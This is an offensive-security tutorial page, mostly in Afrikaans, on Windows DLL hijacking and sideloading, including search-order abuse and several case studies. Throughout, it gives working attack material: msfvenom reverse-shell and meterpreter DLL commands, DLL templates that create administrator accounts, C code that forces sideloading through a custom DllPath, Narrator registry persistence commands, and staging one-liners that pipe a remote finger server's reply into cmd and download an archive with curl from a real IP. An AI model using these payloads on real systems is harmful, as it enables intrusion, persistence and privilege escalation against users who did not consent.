# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulasie van 'n betroubare toepassing om 'n kwaadwillige DLL te laai. Hierdie term dek verskeie taktieke soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, achieving persistence, en minder algemeen vir privilege escalation. Ondanks die fokus op escalation hier, bly die metode van hijacking konsekwent oor verskillende doelwitte.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, en die effektiwiteit hang af van die toepassing se DLL-laai-strategie:

1. **DLL Replacement**: Vervang 'n egte DLL met 'n kwaadwillige een, opsioneel deur gebruik te maak van DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n soekpad voor die regmatige een, en benut die toepassing se soekpatroon.
3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL wat 'n toepassing sal laai omdat dit dink dit is 'n nie-bestaande vereiste DLL.
4. **DLL Redirection**: Wysig soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers om die toepassing na die kwaadwillige DLL te stuur.
5. **WinSxS DLL Replacement**: Vervang die regmatige DLL met 'n kwaadwillige weergawe in die WinSxS gids, 'n metode dikwels geassosieer met DLL side-loading.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n gebruikers-beheerde gids saam met die gekopieerde toepassing, wat ooreenstem met Binary Proxy Execution tegnieke.

> [!TIP]
> Vir 'n stap-vir-stap ketting wat HTML staging, AES-CTR configs, en .NET implants bo-op DLL sideloading laai, sien die werkvloei hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Die algemeenste manier om ontbrekende Dlls in 'n stelsel te vind, is deur [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop en die **volgende 2 filters** te stel:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

en net die **File System Activity** te wys:

![](<../../../images/image (153).png>)

As jy na **missing dlls in general** soek, laat dit vir 'n paar **seconds** loop.\
As jy na 'n **missing dll inside an specific executable** soek, stel 'n ander filter soos "Process Name" "contains" `<exec name>`, voer dit uit, en stop die opname van gebeure.

## Exploiting Missing Dlls

Om privilege escalation te bereik, is ons beste kans om in staat te wees om 'n **Dll te skryf wat 'n geprivilegieerde proses sal probeer laai** in sommige **plek waar dit gaan gesoek word**. Daarom sal ons in staat wees om 'n **dll te skryf** in 'n **folder** waar die **dll eerder gesoek word** as die gids waar die **oorspronklike dll** is (vreemde geval), of ons sal in staat wees om in 'n **gids te skryf waar die dll gaan gesoek word** en die oorspronklike **dll nie in enige gids bestaan nie**.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** soek na DLLs deur 'n stel **pre-defined search paths** te volg, volgens 'n spesifieke volgorde. DLL hijacking ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gidse geplaas word, wat verseker dat dit voor die egte DLL gelaai word. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paadjies gebruik wanneer dit na die DLLs verwys wat dit benodig.

Jy kan die **DLL search order on 32-bit** stelsels hieronder sien:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **default** soekorde met **SafeDllSearchMode** ingeskakel. Wanneer dit gedeaktiveer is, skuif die huidige gids na tweede plek. Om hierdie kenmerk uit te skakel, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (standaard is ingeskakel).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Laastens, let daarop dat 'n dll gelaai kan word deur die absolute pad aan te dui in plaas van net die naam. In daardie geval sal daardie dll slegs in daardie pad gesoek word (as die dll enige afhanklikhede het, sal hulle gesoek word soos net gelaai by naam).

Daar is ander maniere om die soekorde te verander, maar ek gaan dit nie hier verduidelik nie.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

'n Gevorderde manier om deterministies die DLL-soekpad van 'n nuut geskepte proses te beïnvloed, is om die DllPath veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses geskep word met ntdll se native APIs. Deur 'n aanvaller-beheerde gids hier te voorsien, kan 'n teikenproses wat 'n geïmporteerde DLL by naam oplos (geen absolute pad en nie die safe loading flags gebruik nie) gedwing word om 'n kwaadwillige DLL vanaf daardie gids te laai.

Sleutelidee
- Bou die prosesparameters met RtlCreateProcessParametersEx en voorsien 'n pasgemaakte DllPath wat na jou beheerde folder wys (bv. die directory waar jou dropper/unpacker woon).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary 'n DLL by naam oplos, sal die loader hierdie verskafte DllPath raadpleeg tydens resolusie, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE geplaas is nie.

Notas/beperkings
- Dit beïnvloed die kindproses wat geskep word; dit verskil van SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet 'n DLL invoer of LoadLibrary by naam aanroep (geen absolute pad en nie LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories gebruik nie).
- KnownDLLs en hardgekodeerde absolute paadjies kan nie gehijack word nie. Forwarded exports en SxS kan voorgang verander.

Minimale C-voorbeeld (ntdll, wide strings, vereenvoudigde foutbehandeling):

<details>
<summary>Volledige C-voorbeeld: afdwing van DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasionele gebruiksvoorbeeld
- Plaas 'n kwaadwillige xmllite.dll (wat die vereiste funksies uitvoer of as proxy na die regte een dien) in jou DllPath-gids.
- Lanseer 'n gesigneerde binary wat bekend is om xmllite.dll per naam op te soek met bogenoemde tegniek. Die loader los die import op via die verskafte DllPath en sideloads jou DLL.

Hierdie tegniek is in-the-wild waargeneem om multi-stage sideloading chains aan te dryf: 'n initial launcher drop 'n helper DLL, wat dan 'n Microsoft-signed, hijackable binary spawn met 'n custom DllPath om die laai van die attacker’s DLL vanaf 'n staging directory af te dwing.


#### Uitsonderings op die DLL-soekorde uit Windows-dokumentasie

Sekere uitsonderings op die standaard DLL-soekorde word in Windows-dokumentasie genoem:

- Wanneer 'n **DLL wat dieselfde naam deel as een wat reeds in geheue gelaai is** teëgekom word, omseil die stelsel die gewone soektog. In plaas daarvan voer dit 'n kontrole vir redirection en 'n manifest uit voordat dit na die reeds in geheue gelaaide DLL terugval. **In hierdie scenario voer die stelsel nie 'n soektog na die DLL uit nie**.
- In gevalle waar die DLL erken word as 'n **known DLL** vir die huidige Windows-weergawe, sal die stelsel sy weergawe van die known DLL gebruik, tesame met enige van sy afhanklike DLLs, **en dus die soekproses oorslaan**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat 'n lys van hierdie known DLLs.
- As 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLLs gedoen asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL deur 'n volle pad geïdentifiseer is.

### Eskalerende voorregte

**Vereistes**:

- Identifiseer 'n proses wat onder of sal opereer onder **verskillende voorregte** (horizontal or lateral movement), waaraan **'n DLL ontbreek**.
- Verseker dat **skryfregte** beskikbaar is vir enige **gids** waarin die **DLL** gesoek sal word. Hierdie ligging kan die gids van die uitvoerbare lêer of 'n gids binne die stelselpad wees.

Ja, die vereistes is moeilik om te vind aangesien **by default dit vreemd is om 'n uitvoerbare met verhoogde voorregte te vind wat 'n DLL mis** en dit is selfs **vreemder om skryftoestemming op 'n stelselpad-gids te hê** (jy het dit nie standaard nie). Maar in verkeerd gekonfigureerde omgewings is dit moontlik.\
In die geval dat jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs al is die **hoofdoel van die projek om UAC te omseil**, mag jy daar 'n **PoC** van 'n Dll hijaking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waarin jy skryftoestemming het te verander).

Neem kennis dat jy jou **regte in 'n gids kan kontroleer** deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die regte van alle gidse in PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll kontroleer met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te eskaleer** met permissies om in 'n **System Path folder** te skryf, kyk:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatiese gereedskap

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal kontroleer of jy skryfpermissies het op enige gids binne die system PATH.\
Ander interessante outomatiese gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Voorbeeld

As jy 'n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol te benut om 'n **dll te skep wat ten minste al die funksies eksporteer wat die uitvoerbare lêer daarvan sal invoer**. Let wel dat Dll Hijacking handig kan wees om te [eskaleer van Medium Integrity-vlak na High **(om UAC te omseil)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van [**High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system). Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** in hierdie dll hijacking-studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Boonop kan jy in die **volgende afdeling** 'n paar **basiese dll-kodes** vind wat nuttig kan wees as **sjablone**, of om 'n **dll te skep wat nie-vereiste funksies geëksporteer het**.

## **Skep en kompileer Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word**, maar ook om funksionaliteit te **blootstel** en te **werk soos verwag**, deur **alle oproepe na die werklike biblioteek deur te gee**.

Met die hulpmiddel [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n uitvoerbare lêer aandui en die biblioteek kies** wat jy wil proxify en **'n proxified dll genereer**, of **die Dll aandui** en **'n proxified dll genereer**.

### **Meterpreter**

**Kry rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 — ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let daarop dat in verskeie gevalle die DLL wat jy kompileer moet **verskeie funksies exporteer** wat deur die slagofferproses gelaai gaan word; as hierdie funksies nie bestaan nie, sal die **binary nie in staat wees om dit te laai nie** en die **exploit sal misluk**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-voorbeeld met gebruiker-aanmaak</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe ondersoek by opstart steeds 'n voorspelbare, taalspesifieke localization DLL wat ge-hijack kan word om arbitrary code execution en persistence te bewerkstellig.

Key facts
- Probe-pad (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Erfenis-pad (ouer builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As 'n skryfbare, aanvallerbeheerde DLL by die OneCore-pad bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` word uitgevoer. Geen exports word vereis nie.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Begin Narrator en let op die poging om die bogenoemde pad te laai.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC stilte
- A naive hijack sal die UI laat praat/benadruk. Om stil te bly, by attach enumereer Narrator-drade, open die hoofdraad (`OpenThread(THREAD_SUSPEND_RESUME)`) en `SuspendThread` dit; gaan voort in jou eie draad. Sien PoC vir volle kode.

Trigger en persistentie via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde, laai die opgestarte Narrator die geplante DLL. Op die secure desktop (logon screen), druk CTRL+WIN+ENTER om Narrator te begin; jou DLL word as SYSTEM op die secure desktop uitgevoer.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die host, by die logon screen druk CTRL+WIN+ENTER om Narrator te laai; jou DLL word as SYSTEM op die secure desktop uitgevoer.
- Uitvoering stop wanneer die RDP-sessie sluit — inject/migrate onmiddellik.

Bring Your Own Accessibility (BYOA)
- Jy kan 'n ingeboude Accessibility Tool (AT) registry entry kloon (bv. CursorIndicator), dit wysig om na 'n arbitrêre binary/DLL te wys, dit importeer, en dan `configuration` op daardie AT-naam stel. Dit proxieëer arbitrêre uitvoering onder die Accessibility framework.

Notas
- Skryf onder `%windir%\System32` en die verandering van HKLM-waardes vereis admin-regte.
- Alle payload-logika kan in `DLL_PROCESS_ATTACH` woon; geen exports nodig nie.

## Gevallestudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), gemerk as **CVE-2025-1729**.

### Kwesbaarheidsbesonderhede

- **Komponent**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` hardloop daagliks om 9:30 AM onder die konteks van die aangemelde gebruiker.
- **Gidspermissies**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers toelaat om arbitrêre lêers neer te sit.
- **DLL-soekgedrag**: Probeer eers `hostfxr.dll` vanaf sy werkgids laai en log "NAME NOT FOUND" as dit ontbreek, wat aandui dat die plaaslike gids eerste gesoek word.

### Exploit-implementering

'n Aanvaller kan 'n kwaadwillige `hostfxr.dll` stub in dieselfde gids plaas, die ontbrekende DLL uitbuit om kode-uitvoering onder die gebruiker se konteks te bereik:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalvloei

1. As 'n standaard gebruiker, laat `hostfxr.dll` val in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag dat die geskeduleerde taak om 9:30 AM onder die huidige gebruiker se konteks loop.
3. As 'n administrateur aangemeld is wanneer die taak uitgevoer word, hardloop die kwaadwillige DLL in die administrateur se sessie op medium integrity.
4. Skakel standaard UAC bypass-tegnieke aan om van medium integrity na SYSTEM-privileges te verhoog.

## Gevallestudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.

Ketting-oorsig
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI-analise (wat om na te kyk)
- CustomAction table:
- Kyk vir inskrywings wat executables of VBScript laat loop. Voorbeeld verdagte patroon: LaunchApplication wat 'n ingebedde lêer op die agtergrond uitvoer.
- In Orca (Microsoft Orca.exe), ondersoek CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administratiewe uittreksel: msiexec /a package.msi /qb TARGETDIR=C:\out
- Of gebruik lessmsi: lessmsi x package.msi C:\out
- Kyk vir meerdere klein fragmente wat aaneengeskakel en deur 'n VBScript CustomAction gedekripteer word. Algemene vloei:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde gids:
- wsc_proxy.exe: wettige gesigneerde gasheer (Avast). Die proses probeer wsc.dll per naam uit sy gids laai.
- wsc.dll: aanvaller-DLL. As geen spesifieke exports vereis word nie, kan DllMain volstaan; andersins bou 'n proxy DLL en stuur vereiste exports deur na die egte biblioteek terwyl die payload in DllMain uitgevoer word.
- Bou 'n minimale DLL-payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir uitvoervereistes, gebruik 'n proxying framework (bv., DLLirant/Spartacus) om 'n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek berus op DLL-naamresolusie deur die host-binary. As die host absolute paadjies of safe loading flags gebruik (bv., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan die hijack misluk.
- KnownDLLs, SxS, en forwarded exports kan voorkoms beïnvloed en moet oorweeg word tydens die keuse van die host-binary en export-set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point het beskryf hoe Ink Dragon ShadowPad inspan deur 'n drie-lêer triade te gebruik om by legitimite sagteware te meng terwyl die kern-payload op skyf versleuteld bly:

1. **Signed host EXE** – vendors soos AMD, Realtek, of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die aanvallers hernoem die executable om soos 'n Windows-binary te lyk (byvoorbeeld `conhost.exe`), maar die Authenticode-handtekening bly geldig.
2. **Malicious loader DLL** – neergesit langs die EXE met 'n verwagte naam (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik 'n MFC-binary wat met die ScatterBrain framework geobfuskeer is; sy enigste taak is om die versleutelde blob te lok, dit te desifreer, en ShadowPad reflectief te map.
3. **Encrypted payload blob** – dikwels gestoor as `<name>.tmp` in dieselfde gids. Nadat die gedekripteerde payload in geheue-gemappe is, verwyder die loader die TMP-lêer om forensiese bewyse te vernietig.

Handelstegniek-notas:

* Herbenoeming van die signed EXE (terwyl die oorspronklike `OriginalFileName` in die PE-header behou word) laat dit voortspruit as 'n Windows-binary terwyl die vendor-handtekening behou bly, dus replikseer Ink Dragon se gewoonte om `conhost.exe`-agtige binaries neer te sit wat eintlik AMD/NVIDIA utilities is.
* Omdat die executable vertrou bly, hoef meeste allowlisting-beheer slegs jou kwaadwillige DLL langs dit te hê. Fokus op die aanpassing van die loader DLL; die signed ouer kan gewoonlik ongeskonde loop.
* ShadowPad se decryptor verwag die TMP-blob langs die loader te hê en skryfbaar te wees sodat dit die lêer tot nul kan oor skryf nadat dit gemap is. Hou die gids skryfbaar totdat die payload laai; sodra dit in geheue is, kan die TMP-lêer veilig verwyder word vir OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operateurs koppel DLL sideloading met LOLBAS sodat die enigste pasgemaakte artefak op skyf die kwaadwillige DLL langs die vertroude EXE is:

- **Remote command loader (Finger):** Verborgen PowerShell spawn `cmd.exe /c`, trek opdragte van 'n Finger-bediener, en pyp dit na `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` trek TCP/79 teks; `| cmd` voer die bediener-antwoord uit, wat operateurs toelaat om die tweede fase bedienerkant te roteer.

- **Built-in download/extract:** Laai 'n argief met 'n onskuldige uitbreiding af, pak dit uit, en stage die sideload-doel plus DLL onder 'n ewekansige `%LocalAppData%` gids:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` verberg vordering en volg redirects; `tar -xf` gebruik Windows se ingeboude tar.

- **WMI/CIM launch:** Begin die EXE via WMI sodat telemetrie 'n CIM-gegenereerde proses wys terwyl dit die saamgeplaatste DLL laai:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Werk met binaries wat plaaslike DLLs verkies (bv., `intelbq.exe`, `nearby_share.exe`); payload (bv., Remcos) loop onder die vertroude naam.

- **Hunting:** Waarskuwing op `forfiles` wanneer `/p`, `/m`, en `/c` saam verskyn; dit is ongewoon buite admin-skripte.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

'n Onlangse Lotus Blossom intrusie misbruik 'n vertroude opdateringsketting om 'n NSIS-gepakke dropper te lewer wat 'n DLL sideload en ten volle in-geheue payloads stage.

Handelstegniek vloei
- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit as **HIDDEN**, laat 'n herbenoemde Bitdefender Submission Wizard `BluetoothService.exe`, 'n kwaadwillige `log.dll`, en 'n versleutelde blob `BluetoothService` val, en start dan die EXE.
- Die host EXE importeer `log.dll` en roep `LogInit`/`LogWrite`. `LogInit` mmap-laai die blob; `LogWrite` desifreer dit met 'n pasgemaakte LCG-gebaseerde stroom (konstantes **0x19660D** / **0x3C6EF35F**, sleutelmateriaal afgelei van 'n vroeëre hash), oorskryf die buffer met plaintext shellcode, vry maak tydelike hulpbronne, en spring daarnaheen.
- Om 'n IAT te vermy, los die loader APIs op deur uitvoernaam-hashes te gebruik met **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, dan 'n Murmur-styl avalanche toe te pas (**0x85EBCA6B**) en teen gesoute teiken-hashes te vergelyk.

Hoof-shellcode (Chrysalis)
- Desifreer 'n PE-agtige hoofmodule deur herhaalde add/XOR/sub met sleutel `gQ2JR&9;` oor vyf passe, en laai dan dinamies `Kernel32.dll` → `GetProcAddress` om die invoere te voltooi.
- Herstel DLL-naam-stringe tydens uitvoering via per-karakter bit-rotate/XOR transformasies, en laai dan `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
